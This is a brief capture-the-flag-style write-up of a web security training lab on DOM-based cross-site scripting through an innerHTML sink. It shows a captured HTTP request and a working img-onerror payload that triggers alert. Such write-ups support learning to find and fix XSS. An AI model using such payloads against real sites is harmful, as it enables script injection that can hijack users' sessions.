## Lab: DOM XSS in innerHTML sink using source `location.search`

Description:

-  This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

- To solve this lab, perform a cross-site scripting attack that calls the `alert` function. 


```
GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E HTTP/2
Host: 0a830004044016c780d32608003c0014.web-security-academy.net
Cookie: session=rk4inWFWQh9WjjQyZqMcCNNr9ypXEfkP
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a830004044016c780d32608003c0014.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Manual Payload:

```
<img src=1 onerror=alert(1)>
```


Photos:

<p align="center">
    <picture>
        <img src="../photos/labs/cross-site-scripting/lab-dom-xss-in-innerhtml-sink-using-source-location-search-evd-1.jpeg" alt="xss" width='200'/>
    </picture>
</p>